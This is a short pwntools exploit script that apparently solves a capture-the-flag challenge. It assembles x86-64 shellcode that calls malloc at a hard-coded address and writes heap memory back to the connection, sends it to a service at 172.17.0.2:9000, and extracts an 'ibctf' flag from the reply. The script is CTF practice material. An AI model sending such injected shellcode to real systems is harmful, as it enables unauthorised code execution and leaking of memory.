from pwn import *

import re

context.os = 'linux'
context.arch = 'amd64'
# Make sure that 0x42d870 (malloc address) is correct
# The address can change after binary is rebuilt
shellcode = asm('''
    mov eax, 0x42d870
    mov dil, 75
    call rax
    mov dil, 1
    mov rsi, rax
    xor rax, rax
    mov al, 1
    syscall
''', vma=0x400000)

print(len(shellcode))
r = remote('172.17.0.2', 9000)
print(r.recvuntil(b"go:"))
r.sendline(shellcode)
s = re.search(rb'ibctf{[0-9a-zA-Z\-_]+}', r.recvall())
print(s.group())
